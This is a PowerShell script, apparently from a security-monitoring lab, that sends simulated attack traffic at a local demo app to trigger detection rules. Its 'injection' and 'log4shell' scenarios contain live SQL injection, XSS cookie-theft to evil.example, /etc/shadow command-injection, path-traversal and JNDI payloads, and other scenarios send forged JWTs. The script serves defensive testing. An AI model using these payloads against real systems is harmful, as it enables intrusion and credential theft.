# Windows equivalent of simulate-attacks.sh. Generates benign traffic plus the
# suspicious patterns each detection rule looks for.
#
#   powershell -ExecutionPolicy Bypass -File scripts\simulate-attacks.ps1            # every scenario
#   powershell -ExecutionPolicy Bypass -File scripts\simulate-attacks.ps1 bruteforce # one scenario
#
# Basic scenarios:    baseline bruteforce spray privesc idor tokens flood
# Advanced scenarios: takeover distributed hijack injection log4shell recon scanner scraping algnone
# Groups:             basic, advanced (default: everything)
# Only run this against your own lab environment.
param([string[]]$Scenarios)

$ErrorActionPreference = 'Stop'
$root = Split-Path -Parent $PSScriptRoot

# --- load .env ---------------------------------------------------------------
$envFile = Join-Path $root '.env'
if (-not (Test-Path $envFile)) { throw '.env not found - run scripts\generate-env.ps1 first' }
$cfg = @{}
foreach ($line in Get-Content $envFile) {
    if ($line -match '^\s*([A-Za-z_][A-Za-z0-9_]*)=(.*)$') { $cfg[$Matches[1]] = $Matches[2].Trim() }
}
$port = if ($cfg['TARGET_APP_PORT']) { $cfg['TARGET_APP_PORT'] } else { '8080' }
$target = if ($env:TARGET) { $env:TARGET } else { "http://localhost:$port" }
$alicePw = $cfg['DEMO_ALICE_PASSWORD']
$bobPw = $cfg['DEMO_BOB_PASSWORD']

# --- HTTP helpers --------------------------------------------------------------
# HttpClient returns 4xx/5xx responses instead of throwing (unlike Invoke-WebRequest
# on PowerShell 5.1), which is what we want when deliberately triggering 401/403s.
Add-Type -AssemblyName System.Net.Http
$client = [System.Net.Http.HttpClient]::new()

function New-Request([string]$method, [string]$path, [string]$token, [string]$ip, [string]$json) {
    $req = [System.Net.Http.HttpRequestMessage]::new([System.Net.Http.HttpMethod]::new($method), "$target$path")
    # TryAddWithoutValidation: attack payloads (e.g. a JNDI string as User-Agent) are not valid header syntax.
    [void]$req.Headers.TryAddWithoutValidation('X-Forwarded-For', $ip)
    if ($token) { [void]$req.Headers.TryAddWithoutValidation('Authorization', "Bearer $token") }
    if ($json) { $req.Content = [System.Net.Http.StringContent]::new($json, [System.Text.Encoding]::UTF8, 'application/json') }
    return $req
}

function Send([string]$method, [string]$path, [string]$token, [string]$ip, [string]$json) {
    $res = $client.SendAsync((New-Request $method $path $token $ip $json)).GetAwaiter().GetResult()
    return $res
}

function Get-LoginStatus([string]$user, [string]$password, [string]$ip) {
    $body = @{ username = $user; password = $password } | ConvertTo-Json -Compress
    return [int](Send 'POST' '/api/auth/login' $null $ip $body).StatusCode
}

function Get-Token([string]$user, [string]$password, [string]$ip) {
    $body = @{ username = $user; password = $password } | ConvertTo-Json -Compress
    $res = Send 'POST' '/api/auth/login' $null $ip $body
    $text = $res.Content.ReadAsStringAsync().GetAwaiter().GetResult()
    return ($text | ConvertFrom-Json).accessToken
}

function Invoke-Call([string]$method, [string]$path, [string]$token, [string]$ip) {
    return [int](Send $method $path $token $ip $null).StatusCode
}

function Say([string]$text) { Write-Host ''; Write-Host "==> $text" -ForegroundColor Cyan }

# --- scenarios -----------------------------------------------------------------
function baseline {
    Say 'Baseline: normal user activity from 10.0.0.10-12'
    $codes = foreach ($ip in '10.0.0.10', '10.0.0.11', '10.0.0.12') {
        $t = Get-Token 'alice' $alicePw $ip
        foreach ($i in 1..3) { Invoke-Call 'GET' '/api/orders' $t $ip; Invoke-Call 'GET' '/api/users/me' $t $ip }
    }
    $t = Get-Token 'bob' $bobPw '10.0.0.20'
    $codes += [int](Send 'POST' '/api/orders' $t '10.0.0.20' '{"item":"Webcam","quantity":1,"amount":59.90}').StatusCode
    Write-Host ($codes -join ' ')
}

function bruteforce {
    Say "Brute force: 6 wrong passwords for 'alice' from 203.0.113.66 (rule BRUTE_FORCE_LOGIN, >=5 in 2m)"
    $codes = foreach ($i in 1..6) { Get-LoginStatus 'alice' "guess-$i" '203.0.113.66'; Start-Sleep -Milliseconds 300 }
    Write-Host ($codes -join ' ')
}

function spray {
    Say 'Password spray: 12 failures across many accounts from 198.51.100.23 (rule PASSWORD_SPRAY)'
    $users = 'alice', 'bob', 'admin', 'root', 'test', 'guest', 'alice', 'bob', 'admin', 'svc_backup', 'oracle', 'postgres'
    $codes = foreach ($u in $users) { Get-LoginStatus $u 'Summer2026!' '198.51.100.23' }
    Write-Host ($codes -join ' ')
}

function privesc {
    Say "Privilege escalation: 'bob' probing /api/admin (rule RESTRICTED_ENDPOINT_ACCESS)"
    $ip = '172.16.5.40'
    $t = Get-Token 'bob' $bobPw $ip
    $codes = foreach ($p in '/api/admin/stats', '/api/admin/stats', '/api/users', '/api/admin/stats') { Invoke-Call 'GET' $p $t $ip }
    $codes += Invoke-Call 'POST' '/api/admin/maintenance' $t $ip
    Write-Host ($codes -join ' ')
}

function idor {
    Say "IDOR: 'alice' enumerating other users' orders (rule IDOR_ATTEMPT)"
    $ip = '10.0.0.11'
    $t = Get-Token 'alice' $alicePw $ip
    $codes = foreach ($id in 1001, 1002, 1003, 1004, 1003, 1004) { Invoke-Call 'GET' "/api/orders/$id" $t $ip }
    Write-Host ($codes -join ' ')
}

function tokens {
    Say 'Token abuse: 12 forged JWTs from 192.0.2.50 (rule INVALID_TOKEN_ABUSE)'
    $forged = 'eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJhZG1pbiIsInJvbGVzIjpbIlJPTEVfQURNSU4iXX0.forged-signature'
    $codes = foreach ($i in 1..12) { Invoke-Call 'GET' '/api/admin/stats' $forged '192.0.2.50' }
    Write-Host ($codes -join ' ')
}

function flood {
    Say 'Request flood: 150 unauthenticated requests from 192.0.2.99 (rules HIGH_REQUEST_RATE + AUTH_ERROR_SPIKE)'
    # Send in parallel batches of 25, like the bash version.
    for ($batch = 0; $batch -lt 6; $batch++) {
        $tasks = foreach ($i in 1..25) { $client.SendAsync((New-Request 'GET' '/api/orders' $null '192.0.2.99' $null)) }
        [System.Threading.Tasks.Task]::WaitAll([System.Threading.Tasks.Task[]]@($tasks))
        Write-Host -NoNewline "$(($batch + 1) * 25) "
    }
    Write-Host ''
}

# --- advanced scenarios -----------------------------------------------------------
# GET with a custom User-Agent, optional URL-encoded query parameters and extra headers.
function Invoke-Probe([string]$ip, [string]$userAgent, [string]$path, [hashtable]$query, [hashtable]$headers) {
    $url = $path
    if ($query) {
        $pairs = foreach ($k in $query.Keys) { "$k=$([Uri]::EscapeDataString([string]$query[$k]))" }
        $url = "${path}?$($pairs -join '&')"
    }
    $req = New-Request 'GET' $url $null $ip $null
    [void]$req.Headers.TryAddWithoutValidation('User-Agent', $userAgent)
    if ($headers) { foreach ($k in $headers.Keys) { [void]$req.Headers.TryAddWithoutValidation($k, [string]$headers[$k]) } }
    return [int]$client.SendAsync($req).GetAwaiter().GetResult().StatusCode
}

function takeover {
    Say "Account takeover: 6 failed logins for 'bob' then a SUCCESS from 45.155.205.233 (rule ACCOUNT_TAKEOVER)"
    $ip = '45.155.205.233'
    $codes = foreach ($i in 1..6) { Get-LoginStatus 'bob' "Winter202$i!" $ip }
    $codes += Get-LoginStatus 'bob' $bobPw $ip
    $t = Get-Token 'bob' $bobPw $ip
    $codes += Invoke-Call 'GET' '/api/orders' $t $ip
    Write-Host ($codes -join ' ')
}

function distributed {
    Say "Distributed brute force: 'admin' attacked from 6 botnet IPs, 1 attempt each (rule DISTRIBUTED_BRUTE_FORCE)"
    $codes = foreach ($n in 10..15) { Get-LoginStatus 'admin' "P@ssw0rd$n" "5.188.62.$n" }
    Write-Host ($codes -join ' ')
}

function hijack {
    Say "Session hijack: alice's JWT stolen and replayed from 4 foreign IPs (rule SESSION_HIJACK)"
    $t = Get-Token 'alice' $alicePw '10.0.0.30'
    $codes = @(Invoke-Call 'GET' '/api/orders' $t '10.0.0.30')
    foreach ($ip in '185.220.101.4', '103.75.190.11', '91.240.118.172', '45.95.147.236') {
        $codes += Invoke-Call 'GET' '/api/orders' $t $ip
        $codes += Invoke-Call 'GET' '/api/users/me' $t $ip
    }
    Write-Host ($codes -join ' ')
}

function injection {
    Say 'Injection: SQLi / XSS / path traversal / command injection payloads from 103.145.13.7 (rule INJECTION_ATTEMPT)'
    $ip = '103.145.13.7'
    $ua = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)'
    $codes = @(
        Invoke-Probe $ip $ua '/api/orders' @{ id = "1' OR '1'='1" }
        Invoke-Probe $ip $ua '/api/orders' @{ q = '1 UNION SELECT username, password FROM users--' }
        Invoke-Probe $ip $ua '/api/orders' @{ id = '1; SELECT pg_sleep(5)' }
        Invoke-Probe $ip $ua '/api/users' @{ name = "<script>document.location='http://evil.example/?c='+document.cookie</script>" }
        Invoke-Probe $ip $ua '/api/orders' @{ file = '../../../../etc/passwd' }
        Invoke-Probe $ip $ua '/api/orders' @{ host = '127.0.0.1; cat /etc/shadow' }
    )
    Write-Host ($codes -join ' ')
}

function log4shell {
    Say 'Log4Shell: ${jndi:ldap://...} lookup in headers from 45.83.64.1 (rule LOG4SHELL_EXPLOIT)'
    $ip = '45.83.64.1'
    $codes = @(
        Invoke-Probe $ip '${jndi:ldap://45.83.64.1:1389/Exploit}' '/api/orders'
        Invoke-Probe $ip 'Mozilla/5.0' '/api/orders' $null @{ 'X-Api-Version' = '${${lower:j}ndi:ldap://45.83.64.1:1389/a}' }
    )
    Write-Host ($codes -join ' ')
}

function recon {
    Say 'Recon: directory/endpoint discovery of 12 well-known paths from 162.142.125.9 (rule RECON_PATH_SCAN)'
    $paths = '/.env', '/.git/config', '/wp-admin/', '/wp-login.php', '/phpmyadmin/', '/admin', '/server-status',
             '/backup.zip', '/config.json', '/api/v1/users', '/swagger-ui.html', '/console'
    $codes = foreach ($p in $paths) { Invoke-Probe '162.142.125.9' 'Mozilla/5.0 (compatible; Recon/1.0)' $p }
    Write-Host ($codes -join ' ')
}

function scanner {
    Say 'Scanner: sqlmap and nuclei user agents from 194.26.29.110 (rule SCANNER_TOOL)'
    $ip = '194.26.29.110'
    $codes = foreach ($i in 1..3) {
        Invoke-Probe $ip 'sqlmap/1.8.4#stable (https://sqlmap.org)' '/api/orders' @{ id = "$i" }
        Invoke-Probe $ip 'Mozilla/5.0 (compatible; Nuclei - Open-source project (github.com/projectdiscovery/nuclei))' "/api/orders/$i"
    }
    Write-Host ($codes -join ' ')
}

function scraping {
    Say "Data scraping: 'alice' reads her orders 45 times in a few seconds (rule DATA_SCRAPING)"
    $t = Get-Token 'alice' $alicePw '10.0.0.13'
    foreach ($i in 1..45) {
        [void](Invoke-Call 'GET' "/api/orders/$(1001 + ($i % 2))" $t '10.0.0.13')
        if ($i % 15 -eq 0) { Write-Host -NoNewline "$i " }
    }
    Write-Host ''
}

function algnone {
    Say 'JWT forgery: unsigned alg=none token claiming ROLE_ADMIN from 192.0.2.77 (rule JWT_ALG_NONE)'
    # {"alg":"none"}.{"iss":"mini-soc-target-app","sub":"admin","roles":["ROLE_USER","ROLE_ADMIN"],"jti":"forged-alg-none"}.
    $none = 'eyJhbGciOiJub25lIn0.eyJpc3MiOiJtaW5pLXNvYy10YXJnZXQtYXBwIiwic3ViIjoiYWRtaW4iLCJyb2xlcyI6WyJST0xFX1VTRVIiLCJST0xFX0FETUlOIl0sImp0aSI6ImZvcmdlZC1hbGctbm9uZSJ9.'
    $codes = @((Invoke-Call 'GET' '/api/admin/stats' $none '192.0.2.77'), (Invoke-Call 'GET' '/api/users' $none '192.0.2.77'))
    Write-Host ($codes -join ' ')
}

# --- main ------------------------------------------------------------------------
$basic = 'baseline', 'bruteforce', 'spray', 'privesc', 'idor', 'tokens', 'flood'
$advanced = 'takeover', 'distributed', 'hijack', 'injection', 'log4shell', 'recon', 'scanner', 'scraping', 'algnone'
$all = $basic + $advanced
$expanded = foreach ($s in $Scenarios) {
    if ($s -eq 'basic') { $basic } elseif ($s -eq 'advanced') { $advanced } else { $s }
}
$Scenarios = @($expanded)
if ($Scenarios.Count -eq 0) { $Scenarios = $all }
foreach ($s in $Scenarios) {
    if ($all -notcontains $s) { throw "Unknown scenario: $s (valid: basic, advanced, $($all -join ', '))" }
    & $s
}

$poll = if ($cfg['DETECTION_POLL_INTERVAL']) { $cfg['DETECTION_POLL_INTERVAL'] } else { 'PT15S' }
$dash = if ($cfg['DASHBOARD_PORT']) { $cfg['DASHBOARD_PORT'] } else { '3000' }
Say "Done. Detections run every $poll (log shipping adds a few seconds)."
Write-Host "Open the dashboard: http://localhost:$dash"
